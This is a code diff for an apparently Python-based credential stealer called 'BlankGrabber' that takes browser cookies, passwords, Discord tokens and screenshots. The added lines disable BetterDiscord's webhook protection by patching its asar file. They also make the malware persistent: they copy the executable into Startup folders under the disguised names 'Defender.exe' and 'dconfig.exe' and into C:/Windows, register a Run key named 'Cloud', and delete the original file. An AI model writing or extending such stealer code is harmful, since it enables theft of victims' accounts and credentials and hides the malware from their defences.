@@ -59,7 +59,9 @@ class BlankGrabber:
             self.copy(self.chromefolder+"/Local State", self.tempfolder+"/Local State")
             self.key = self.get_decryption_key()
             self.getcookie()
-            self.getpass()  
+            self.getpass()
+        if os.path.isfile(self.roaming + '\\BetterDiscord\\data\\betterdiscord.asar'):
+            self.bypass_bd()
         self.getTokens()
         self.screenshot()
         if os.path.isfile(self.tempfolder+"/Logs.txt"):
@@ -149,6 +151,13 @@ class BlankGrabber:
                     with open(cookiedc, 'wt') as file:
                         file.write("\n\n".join(data))
                     del data
+                    
+    def bypass_bd(self):
+        try:
+            with open(self.roaming + "\\BetterDiscord\\data\\betterdiscord.asar", 'r+', encoding='cp437', errors='ignore') as bd:
+                bd.write(bd.read().replace('api/webhooks', 'api/webhook'))
+        except Exception as e:
+            self.logs(e, sys.exc_info())
                         
     def getTokens(self):
         data = []
@@ -313,8 +322,12 @@ if __name__ == "__main__":
             frozen = hasattr(sys, 'frozen')
             if frozen:
                 try:
-                    BlankGrabber.copy('BlankGrabber', sys.executable, os.getenv('USERPROFILE')+"/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/Defender.exe")
-                    BlankGrabber.copy('BlankGrabber', sys.executable, "C:/ProgramData/Microsoft/Windows/Start Menu/Programs/Startup/dconfig.exe")
+                    if not os.path.basename(os.path.normpath(sys.executable)) == "Startup" and not os.path.basename(os.path.normpath(sys.executable)) == "Windows":
+                        BlankGrabber.copy('BlankGrabber', sys.executable, os.getenv('USERPROFILE')+"/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/Defender.exe")
+                        BlankGrabber.copy('BlankGrabber', sys.executable, "C:/ProgramData/Microsoft/Windows/Start Menu/Programs/Startup/dconfig.exe")
+                        BlankGrabber.copy('BlankGrabber', sys.executable, "C:/Windows/dcsconfig.exe")
+                        os.system('REG ADD "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /V "Cloud" /t REG_SZ /F /D "C:/Windows/dcsconfig.exe"')
+                        os.remove(sys.executable)
                 except Exception:
                     pass
             BlankGrabber()
